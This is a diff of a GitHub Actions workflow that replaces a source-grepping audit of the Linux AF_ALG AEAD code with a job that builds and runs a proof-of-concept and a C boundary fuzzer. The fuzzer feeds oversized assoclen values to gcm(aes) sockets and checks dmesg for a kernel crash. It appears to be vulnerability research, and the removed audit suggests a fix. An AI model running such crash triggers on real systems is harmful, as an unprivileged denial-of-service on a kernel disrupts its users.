@@ -1,4 +1,4 @@
-name: AF_ALG Security Audit
+name: AF_ALG Vulnerability PoC
 
 on:
   push:
@@ -7,312 +7,243 @@ on:
 jobs:
 
   # ══════════════════════════════════════════════════════════════
-  # JOB 1 — تحقق من sg_next() سلوكها مع end marker
-  # السؤال: هل ترجع NULL أم تكمل؟
+  # JOB 1 — بناء الـ PoC والتحقق من AF_ALG support
   # ══════════════════════════════════════════════════════════════
-  check-sg-next:
-    name: "① sg_next() behavior with end marker"
+  build-and-check:
+    name: "① Build PoC + Check kernel config"
     runs-on: ubuntu-latest
     steps:
-      - name: Fetch scatterlist header
-        run: |
-          curl -sL \
-            https://raw.githubusercontent.com/torvalds/linux/refs/heads/master/include/linux/scatterlist.h \
-            -o scatterlist.h
+      - uses: actions/checkout@v4
 
-      - name: Extract sg_next definition
+      - name: Install dependencies
+        run: sudo apt-get install -y gcc libssl-dev
+
+      - name: Check kernel CONFIG_CRYPTO_USER_API_AEAD
         run: |
-          echo "=== sg_next() definition ==="
-          grep -A 15 "static inline struct scatterlist \*sg_next" scatterlist.h
+          echo "=== Kernel version ==="
+          uname -r
 
           echo ""
-          echo "=== sg_is_last() definition ==="
-          grep -A 5 "sg_is_last" scatterlist.h | head -20
-
-          echo ""
-          echo "=== SG_END bit value ==="
-          grep -E "SG_END|SG_CHAIN|page_link" scatterlist.h | head -20
-
-      - name: Confirm NULL return path
-        run: |
-          echo "=== Does sg_next return NULL when last? ==="
-          if grep -q "return NULL" scatterlist.h; then
-            echo "CONFIRMED: sg_next() returns NULL on last entry"
+          echo "=== AF_ALG crypto config ==="
+          CONFIG="/boot/config-$(uname -r)"
+          if [ -f "$CONFIG" ]; then
+            grep -E "CONFIG_CRYPTO_USER_API" "$CONFIG"
+          elif [ -f /proc/config.gz ]; then
+            zcat /proc/config.gz | grep -E "CONFIG_CRYPTO_USER_API"
           else
-            echo "NOT FOUND in header — check scatterlist.c"
+            echo "Config not found, will test directly"
           fi
 
-      - name: Fetch scatterlist.c for confirmation
-        run: |
-          curl -sL \
-            https://raw.githubusercontent.com/torvalds/linux/refs/heads/master/lib/scatterlist.c \
-            -o scatterlist.c
-          echo "=== sg_next in .c ==="
-          grep -A 10 "sg_next" scatterlist.c | head -30
+      - name: Build PoC
+        run: gcc -O0 -Wall -o poc_aead poc_aead_assoclen.c && echo "✅ Build OK"
 
+      - name: Upload binary
+        uses: actions/upload-artifact@v4
+        with:
+          name: poc-binary
+          path: poc_aead
 
   # ══════════════════════════════════════════════════════════════
-  # JOB 2 — تحقق من memcpy_sglist: هل تفحص حدود dst؟
-  # السؤال: هل تتوقف عند نهاية dst أم تكمل؟
+  # JOB 2 — تشغيل الـ PoC وقراءة النتيجة
   # ══════════════════════════════════════════════════════════════
-  check-memcpy-sglist:
-    name: "② memcpy_sglist() dst bounds check"
+  run-poc:
+    name: "② Run PoC — does it crash or return EINVAL?"
     runs-on: ubuntu-latest
+    needs: build-and-check
     steps:
-      - name: Fetch scatterwalk.c
-        run: |
-          curl -sL \
-            https://raw.githubusercontent.com/torvalds/linux/refs/heads/master/crypto/scatterwalk.c \
-            -o scatterwalk.c
+      - uses: actions/checkout@v4
 
-      - name: Extract memcpy_sglist full body
-        run: |
-          echo "=== memcpy_sglist() full implementation ==="
-          # استخراج الدالة كاملة
-          awk '/^void memcpy_sglist/,/^}/' scatterwalk.c
+      - name: Build
+        run: gcc -O0 -Wall -o poc_aead poc_aead_assoclen.c
 
-      - name: Check for dst bounds validation
+      - name: Capture dmesg before
+        run: sudo dmesg | tail -5 > dmesg_before.txt || true
+
+      - name: Run PoC
+        id: run_poc
         run: |
+          echo "=== Running PoC ==="
+          timeout 30 ./poc_aead 2>&1 | tee poc_output.txt
+          echo "exit_code=$?" >> $GITHUB_OUTPUT
+
+      - name: Capture dmesg after
+        run: |
+          sudo dmesg | tail -20 > dmesg_after.txt || true
+          echo "=== dmesg diff (new kernel messages) ==="
+          diff dmesg_before.txt dmesg_after.txt || true
+
+      - name: Analyze result
+        run: |
+          echo "=== PoC Output ==="
+          cat poc_output.txt
+
           echo ""
-          echo "=== Does memcpy_sglist validate dst capacity? ==="
+          echo "=== Verdict ==="
 
-          # هل يوجد أي فحص لحجم dst قبل الكتابة؟
-          if awk '/^void memcpy_sglist/,/^}/' scatterwalk.c | \
-             grep -qE "(dst.*length|dst.*size|WARN|BUG_ON)"; then
-            echo "FOUND: dst validation exists"
+          if grep -q "PROTECTED" poc_output.txt; then
+            echo "✅ SAFE: Kernel returned EINVAL — vulnerability is mitigated"
+
+          elif grep -q "Kernel panic\|BUG:\|NULL pointer\|general protection" dmesg_after.txt; then
+            echo "🔴 VULNERABLE: Kernel panic detected in dmesg!"
+            echo "=== Crash details ==="
+            grep -A 20 "BUG:\|NULL pointer\|general protection" dmesg_after.txt
+
+          elif grep -q "SIGSEGV\|Segmentation\|killed" poc_output.txt; then
+            echo "🔴 VULNERABLE: Process killed by kernel — likely NULL deref"
+
+          elif grep -q "EFAULT\|14" poc_output.txt; then
+            echo "⚠️  POSSIBLE: Got EFAULT — memory access issue"
+
           else
-            echo "NOT FOUND: No dst bounds check — writes blindly to dst"
+            echo "❓ UNKNOWN: Review output manually"
           fi
 
-          echo ""
-          echo "=== sg_next(dst) call — where is it? ==="
-          awk '/^void memcpy_sglist/,/^}/' scatterwalk.c | grep -n "sg_next\|dst ="
-
+      - name: Upload artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: poc-results
+          path: |
+            poc_output.txt
+            dmesg_after.txt
 
   # ══════════════════════════════════════════════════════════════
-  # JOB 3 — تحقق من aead_assoclen vs usedpages
-  # السؤال: هل يوجد فحص usedpages >= aead_assoclen قبل memcpy_sglist؟
+  # JOB 3 — اختبار حدود مختلفة (fuzz بسيط)
   # ══════════════════════════════════════════════════════════════
-  check-assoclen-guard:
-    name: "③ aead_assoclen guard before memcpy_sglist"
+  boundary-fuzz:
+    name: "③ Boundary testing — different assoclen values"
     runs-on: ubuntu-latest
+    needs: build-and-check
     steps:
-      - name: Fetch algif_aead.c
+      - uses: actions/checkout@v4
+
+      - name: Build fuzzer
         run: |
-          curl -sL \
-            https://raw.githubusercontent.com/torvalds/linux/refs/heads/master/crypto/algif_aead.c \
-            -o algif_aead.c
+          cat << 'FUZZ' > fuzz_assoclen.c
+          #include <stdio.h>
+          #include <stdlib.h>
+          #include <string.h>
+          #include <unistd.h>
+          #include <errno.h>
+          #include <sys/socket.h>
+          #include <linux/if_alg.h>
 
-      - name: Extract _aead_recvmsg full body
+          #ifndef SOL_ALG
+          #define SOL_ALG 279
+          #endif
+
+          #define KEY_LEN  16
+          #define IV_LEN   12
+          #define TAG_LEN  16
+
+          /* اختبار assoclen معين مقابل rx_size معين */
+          static const char* test_case(uint32_t assoclen, size_t rx_size) {
+              struct sockaddr_alg sa = {
+                  .salg_family = AF_ALG,
+                  .salg_type   = "aead",
+                  .salg_name   = "gcm(aes)",
+              };
+              int sfd = socket(AF_ALG, SOCK_SEQPACKET, 0);
+              if (sfd < 0) return "NO_SOCKET";
+
+              if (bind(sfd, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
+                  close(sfd); return "BIND_FAIL";
+              }
+
+              uint8_t key[KEY_LEN] = {0};
+              setsockopt(sfd, SOL_ALG, ALG_SET_KEY, key, KEY_LEN);
+              setsockopt(sfd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, TAG_LEN);
+
+              int cfd = accept(sfd, NULL, 0);
+              if (cfd < 0) { close(sfd); return "ACCEPT_FAIL"; }
+
+              /* TX */
+              size_t tx_size = assoclen + 32;
+              uint8_t *tx = calloc(1, tx_size);
+
+              /* Simple CMSG */
+              struct {
+                  char iv_cmsg[CMSG_SPACE(sizeof(struct af_alg_iv) + IV_LEN)];
+                  char op_cmsg[CMSG_SPACE(sizeof(uint32_t))];
+                  char al_cmsg[CMSG_SPACE(sizeof(uint32_t))];
+              } cb;
+              memset(&cb, 0, sizeof(cb));
+
+              struct cmsghdr *c = (struct cmsghdr*)cb.iv_cmsg;
+              c->cmsg_level = SOL_ALG; c->cmsg_type = ALG_SET_IV;
+              c->cmsg_len = CMSG_LEN(sizeof(struct af_alg_iv)+IV_LEN);
+              ((struct af_alg_iv*)CMSG_DATA(c))->ivlen = IV_LEN;
+
+              c = (struct cmsghdr*)cb.op_cmsg;
+              c->cmsg_level = SOL_ALG; c->cmsg_type = ALG_SET_OP;
+              c->cmsg_len = CMSG_LEN(sizeof(uint32_t));
+              *(uint32_t*)CMSG_DATA(c) = ALG_OP_ENCRYPT;
+
+              c = (struct cmsghdr*)cb.al_cmsg;
+              c->cmsg_level = SOL_ALG; c->cmsg_type = ALG_SET_AEAD_ASSOCLEN;
+              c->cmsg_len = CMSG_LEN(sizeof(uint32_t));
+              *(uint32_t*)CMSG_DATA(c) = assoclen;
+
+              struct iovec iov = {tx, tx_size};
+              struct msghdr mt = {0};
+              mt.msg_iov = &iov; mt.msg_iovlen = 1;
+              mt.msg_control = &cb; mt.msg_controllen = sizeof(cb);
+              sendmsg(cfd, &mt, 0);
+
+              /* RX */
+              uint8_t *rx = calloc(1, rx_size + 1);
+              struct iovec riov = {rx, rx_size};
+              struct msghdr mr = {0};
+              mr.msg_iov = &riov; mr.msg_iovlen = 1;
+              ssize_t ret = recvmsg(cfd, &mr, 0);
+
+              free(tx); free(rx);
+              close(cfd); close(sfd);
+
+              if (ret > 0)       return "OK";
+              if (errno == EINVAL) return "EINVAL(safe)";
+              if (errno == EMSGSIZE) return "EMSGSIZE";
+              if (errno == EFAULT)   return "EFAULT(!)";
+              return "OTHER";
+          }
+
+          int main(void) {
+              /* جدول: assoclen × rx_size */
+              uint32_t assoclens[] = {0, 16, 100, 1000, 4000};
+              size_t   rxsizes[]   = {10, 16, 100, 1000, 8000};
+              int na = sizeof(assoclens)/sizeof(assoclens[0]);
+              int nr = sizeof(rxsizes)/sizeof(rxsizes[0]);
+
+              printf("%-12s", "assoc\\rx");
+              for (int j=0; j<nr; j++) printf(" %8zu", rxsizes[j]);
+              printf("\n");
+              printf("%s\n", "------------------------------------------------------");
+
+              for (int i=0; i<na; i++) {
+                  printf("%-12u", assoclens[i]);
+                  for (int j=0; j<nr; j++) {
+                      const char *r = test_case(assoclens[i], rxsizes[j]);
+                      printf(" %8s", r);
+                  }
+                  printf("\n");
+              }
+              printf("\nKey: EINVAL(safe)=protected, EFAULT=memory issue, OK=success\n");
+              return 0;
+          }
+          FUZZ
+          gcc -O0 -Wall -o fuzz_assoclen fuzz_assoclen.c && echo "✅ Fuzzer built"
+
+      - name: Run boundary fuzz
         run: |
-          echo "=== _aead_recvmsg() — full function ==="
-          awk '/^static int _aead_recvmsg/,/^}/' algif_aead.c
-
-      - name: Check for assoclen vs usedpages guard
-        run: |
+          echo "=== assoclen × rx_buffer boundary matrix ==="
+          sudo dmesg > dmesg_pre.txt 2>/dev/null || true
+          timeout 60 ./fuzz_assoclen 2>&1
           echo ""
-          echo "=== Is there a check: usedpages >= aead_assoclen? ==="
+          echo "=== New kernel messages after fuzz ==="
+          sudo dmesg > dmesg_post.txt 2>/dev/null || true
+          diff dmesg_pre.txt dmesg_post.txt | grep "^>" | head -20 || echo "(no new messages)"
 
-          FUNC=$(awk '/^static int _aead_recvmsg/,/^}/' algif_aead.c)
-
-          # هل يوجد فحص صريح؟
-          if echo "$FUNC" | grep -qE "usedpages.*assoclen|assoclen.*usedpages"; then
-            echo "GUARD EXISTS: usedpages vs aead_assoclen check found"
-            echo "$FUNC" | grep -n "assoclen"
-          else
-            echo "NO GUARD: usedpages vs aead_assoclen — check MISSING"
-          fi
-
-          echo ""
-          echo "=== Line order: usedpages calculation vs memcpy_sglist ==="
-          grep -n "usedpages\|memcpy_sglist\|aead_assoclen" algif_aead.c | head -30
-
-      - name: Trace the exact data flow
-        run: |
-          echo ""
-          echo "=== outlen shrink path — does assoclen shrink too? ==="
-          awk '/if \(usedpages < outlen\)/,/memcpy_sglist/' algif_aead.c | head -20
-
-
-  # ══════════════════════════════════════════════════════════════
-  # JOB 4 — تحقق من first_rsgl: هل sg_mark_end مضبوطة؟
-  # السؤال: هل الـ end marker موجودة فعلاً على آخر entry؟
-  # ══════════════════════════════════════════════════════════════
-  check-rsgl-end-marker:
-    name: "④ first_rsgl sg_mark_end presence"
-    runs-on: ubuntu-latest
-    steps:
-      - name: Fetch af_alg.c
-        run: |
-          curl -sL \
-            https://raw.githubusercontent.com/torvalds/linux/refs/heads/master/crypto/af_alg.c \
-            -o af_alg.c
-
-      - name: Extract af_alg_get_rsgl
-        run: |
-          echo "=== af_alg_get_rsgl() — full function ==="
-          awk '/^int af_alg_get_rsgl/,/^}/' af_alg.c
-
-      - name: Confirm sg_mark_end is set
-        run: |
-          echo ""
-          echo "=== Is sg_mark_end called on first_rsgl? ==="
-          FUNC=$(awk '/^int af_alg_get_rsgl/,/^}/' af_alg.c)
-
-          if echo "$FUNC" | grep -q "sg_mark_end"; then
-            echo "CONFIRMED: sg_mark_end IS set on rsgl entries"
-            echo "$FUNC" | grep -n "sg_mark_end"
-          else
-            echo "NOT FOUND: sg_mark_end not called — heap corruption path"
-          fi
-
-          echo ""
-          echo "=== What size is first_rsgl initialized with? ==="
-          echo "$FUNC" | grep -n "sg_init_table\|ALG_MAX_PAGES\|nents"
-
-
-  # ══════════════════════════════════════════════════════════════
-  # JOB 5 — تحقق من ctx->inflight وحماية AIO في skcipher
-  # السؤال: هل lock_sock يحمي ctx->inflight في كل مسار؟
-  # ══════════════════════════════════════════════════════════════
-  check-inflight-locking:
-    name: "⑤ ctx->inflight locking in skcipher AIO"
-    runs-on: ubuntu-latest
-    steps:
-      - name: Fetch algif_skcipher.c
-        run: |
-          curl -sL \
-            https://raw.githubusercontent.com/torvalds/linux/refs/heads/master/crypto/algif_skcipher.c \
-            -o algif_skcipher.c
-
-      - name: Fetch af_alg.c for alloc_areq
-        run: |
-          curl -sL \
-            https://raw.githubusercontent.com/torvalds/linux/refs/heads/master/crypto/af_alg.c \
-            -o af_alg.c
-
-      - name: Check inflight set/clear paths
-        run: |
-          echo "=== All inflight references in af_alg.c ==="
-          grep -n "inflight" af_alg.c
-
-          echo ""
-          echo "=== All inflight references in algif_skcipher.c ==="
-          grep -n "inflight" algif_skcipher.c
-
-      - name: Check lock_sock coverage
-        run: |
-          echo ""
-          echo "=== lock_sock calls in skcipher_recvmsg ==="
-          awk '/^static int skcipher_recvmsg/,/^}/' algif_skcipher.c | \
-            grep -n "lock_sock\|release_sock\|inflight\|sock_hold\|sock_put"
-
-          echo ""
-          echo "=== algif_skcipher_done — locking context? ==="
-          awk '/^static void algif_skcipher_done/,/^}/' algif_skcipher.c
-
-          echo ""
-          echo "=== algif_skcipher_export — locking context? ==="
-          awk '/^static int algif_skcipher_export/,/^}/' algif_skcipher.c
-
-      - name: Check sock_destruct locking
-        run: |
-          echo ""
-          echo "=== skcipher_sock_destruct ==="
-          awk '/^static void skcipher_sock_destruct/,/^}/' algif_skcipher.c
-
-
-  # ══════════════════════════════════════════════════════════════
-  # JOB 6 — تجميع النتائج وإصدار الحكم النهائي
-  # ══════════════════════════════════════════════════════════════
-  final-verdict:
-    name: "⑥ Final Security Verdict"
-    runs-on: ubuntu-latest
-    needs:
-      - check-sg-next
-      - check-memcpy-sglist
-      - check-assoclen-guard
-      - check-rsgl-end-marker
-      - check-inflight-locking
-    steps:
-      - name: Fetch all files needed
-        run: |
-          curl -sL https://raw.githubusercontent.com/torvalds/linux/refs/heads/master/crypto/algif_aead.c     -o algif_aead.c
-          curl -sL https://raw.githubusercontent.com/torvalds/linux/refs/heads/master/crypto/algif_skcipher.c -o algif_skcipher.c
-          curl -sL https://raw.githubusercontent.com/torvalds/linux/refs/heads/master/crypto/af_alg.c         -o af_alg.c
-          curl -sL https://raw.githubusercontent.com/torvalds/linux/refs/heads/master/crypto/scatterwalk.c    -o scatterwalk.c
-          curl -sL https://raw.githubusercontent.com/torvalds/linux/refs/heads/master/include/linux/scatterlist.h -o scatterlist.h
-
-      - name: Run consolidated checks
-        run: |
-          echo "╔══════════════════════════════════════════════════════════════╗"
-          echo "║           AF_ALG SECURITY AUDIT — FINAL REPORT              ║"
-          echo "╠══════════════════════════════════════════════════════════════╣"
-
-          # ── CHECK 1: sg_next NULL return ──
-          echo ""
-          echo "CHECK 1: sg_next() returns NULL on last entry"
-          if grep -q "return NULL" scatterlist.h; then
-            echo "  RESULT: ✅ CONFIRMED — sg_next returns NULL"
-          else
-            # قد يكون في .c
-            echo "  RESULT: ⚠️  Check scatterlist.c manually"
-          fi
-
-          # ── CHECK 2: memcpy_sglist has no dst bounds check ──
-          echo ""
-          echo "CHECK 2: memcpy_sglist dst bounds validation"
-          MEMCPY=$(awk '/^void memcpy_sglist/,/^}/' scatterwalk.c)
-          if echo "$MEMCPY" | grep -qE "WARN|BUG_ON|dst.*capacity|dst.*size"; then
-            echo "  RESULT: ✅ SAFE — dst validation exists"
-          else
-            echo "  RESULT: 🔴 UNSAFE — no dst bounds check in memcpy_sglist"
-          fi
-
-          # ── CHECK 3: missing guard aead_assoclen vs usedpages ──
-          echo ""
-          echo "CHECK 3: Guard usedpages >= aead_assoclen before memcpy_sglist"
-          RECVMSG=$(awk '/^static int _aead_recvmsg/,/^}/' algif_aead.c)
-          if echo "$RECVMSG" | grep -qE "usedpages.*assoclen|assoclen.*usedpages"; then
-            echo "  RESULT: ✅ GUARD EXISTS"
-          else
-            echo "  RESULT: 🔴 GUARD MISSING — potential null deref / oob write"
-          fi
-
-          # ── CHECK 4: sg_mark_end on rsgl ──
-          echo ""
-          echo "CHECK 4: sg_mark_end set on first_rsgl"
-          GETRSGL=$(awk '/^int af_alg_get_rsgl/,/^}/' af_alg.c)
-          if echo "$GETRSGL" | grep -q "sg_mark_end"; then
-            echo "  RESULT: ✅ sg_mark_end IS set → sg_next returns NULL → DoS path"
-          else
-            echo "  RESULT: 🔴 sg_mark_end NOT set → heap corruption path"
-          fi
-
-          # ── CHECK 5: inflight locking ──
-          echo ""
-          echo "CHECK 5: ctx->inflight protected by lock_sock in all paths"
-          DONE=$(awk '/^static void algif_skcipher_done/,/^}/' algif_skcipher.c)
-          EXPORT=$(awk '/^static int algif_skcipher_export/,/^}/' algif_skcipher.c)
-
-          if echo "$DONE$EXPORT" | grep -q "lock_sock"; then
-            echo "  RESULT: ✅ lock_sock present in AIO callback"
-          else
-            echo "  RESULT: ⚠️  No lock_sock in done/export — verify sock_hold suffices"
-            echo "          (sock_hold prevents destruct but not concurrent state access)"
-          fi
-
-          echo ""
-          echo "╠══════════════════════════════════════════════════════════════╣"
-          echo "║  SUMMARY                                                     ║"
-          echo "╠══════════════════════════════════════════════════════════════╣"
-          echo "║                                                              ║"
-          echo "║  If CHECK 2=UNSAFE and CHECK 3=MISSING and CHECK 4=set:     ║"
-          echo "║  → NULL deref in memcpy_sglist when aead_assoclen > RX buf  ║"
-          echo "║  → Unprivileged user can trigger kernel panic (DoS)          ║"
-          echo "║                                                              ║"
-          echo "║  Fix needed in _aead_recvmsg():                             ║"
-          echo "║    if (usedpages < ctx->aead_assoclen) {                    ║"
-          echo "║        err = -EINVAL; goto free;                            ║"
-          echo "║    }                                                         ║"
-          echo "╚══════════════════════════════════════════════════════════════╝"
+      - name: Upload fuzz results
+        uses: actions/upload-artifact@v4
+        with:
+          name: fuzz-results
+          path: dmesg_post.txt
